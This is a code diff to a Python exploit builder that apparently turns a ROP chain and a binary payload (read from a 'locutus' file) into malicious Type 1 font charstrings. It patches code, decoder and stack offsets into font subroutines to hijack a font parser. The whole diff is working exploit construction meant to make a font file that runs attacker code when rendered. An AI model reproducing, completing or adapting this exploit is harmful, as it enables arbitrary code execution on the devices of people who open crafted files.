@@ -26,17 +26,15 @@
 
 import struct
 
-def wont_make_tsd_cry(numbers):
-    for number in numbers:
-        number %= (2**32)
-        if number >= (2**31): number -= (2**32)
-        if number == 0: continue
-        if -32000 <= number <= 32000: return False
-        return True
-
 def to_signed_dec(number):
+    global large_int
     number %= (2**32)
     if number >= (2**31): number -= (2**32)
+    if -32000 <= number <= 32000:
+        if number != 0 and not large_int:
+            raise Exception('to_signed_dec: nope (%x)' % number)
+    else:
+        large_int = True
     return str(number)
 
 def encode_unknown(s):
@@ -51,7 +49,7 @@ file0 = 'i am a file'
 file1 = 'i am also a file'
 
 # these are read by the ROP stuff
-subrs[0] = encode_unknown(file0)
+subrs[0] = encode_unknown(open('../locutus/locutus').read())
 subrs[1] = encode_unknown(file1)
 #subrs[0] = '0 3735928559 setcurrentpoint return' # 0xdeadbeef
 
@@ -79,31 +77,43 @@ main = '''3 0 setcurrentpoint
           0                    % start the <= chain
           '''
 
-addies = {0x33816765: open('../goo/catalog/final.txt').read(), 0x31000000: 'xxxx', 0x34000000: 'xxxx'}
+addies = {0x33816765: (open('../goo/catalog/stub.txt').read(), open('../goo/catalog/catalog.txt').read()), 0x0000a000: ('xxxx', ''), 0x34000000: ('xxxx', '')}
 
 subrno = max(filter(lambda a: isinstance(a, int), subrs.keys())) + 1
-for addy, data in sorted(addies.items()):
-    data = struct.unpack('I'*(len(data)/4), data)
-    parse_callback = data.pop(0)
+
+stack_400_loc = 20
+
+for addy, (stub, catalog) in sorted(addies.items()):
+    stub += '\0' * (-len(stub) & 3)
+    stub = list(struct.unpack('I'*(len(stub)/4), stub))
+    parse_callback = stub.pop(0)
     assert addy > 32000
     assert parse_callback > 32000
-    assert wont_make_tsd_cry(data)
-    subr = '0 %s setcurrentpoint ' % to_signed_dec(parse_callback)
-    for number in data: subr += to_signed_dec(number) + ' '
-    subr += 'dotsection %d 42 callothersubr return' % len(data)
-
+    subr = 'dotsection -%d 42 callothersubr ' % stack_400_loc
+    large_int = False
+    subr += '0 %s setcurrentpoint ' % to_signed_dec(parse_callback)
+    for number in stub:
+        #print hex(number)
+        if (number & 0xffff0000) == 0xfefd0000: # code offset
+            number += 0x10000 + 0x70 + stack_400_loc*4
+        if number == 0xfefefefe: # the subr offset
+            subr += to_signed_dec((subrno+1)*4) + ' '
+        elif (number & 0xffff0000) == 0xfefe0000: # decoder offset
+            subr += to_signed_dec((number - 0xfefe0000) - 0x70 - 257*4) + ' dotsection 0 1 25 callothersubr pop 2 20 callothersubr pop '
+            large_int = False
+        else:
+            subr += to_signed_dec(number) + ' '
+    subr += 'dotsection 2 callsubr %d 42 callothersubr return' % -(344 - stack_400_loc - len(stub))
+    large_int = False
     subrs[subrno] = subr
-    #subrs[subrno+1] = encode_unknown(data)
+    subrs[subrno+1] = encode_unknown(catalog)
 
     # the dotsection is to make large_integer false
     main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' dotsection 4 27 callothersubr pop\n'
     
-    subrno += 1
+    subrno += 2
 
-main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback,
-                            % then come back down
-           2 callsubr       % now go up the second time
-           -344 42 callothersubr
+main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback, start flex, then go up to 344)
            callothersubr
            hstem3 hstem3 hstem3 hstem3
            hstem3 hstem3 hstem3 hstem3
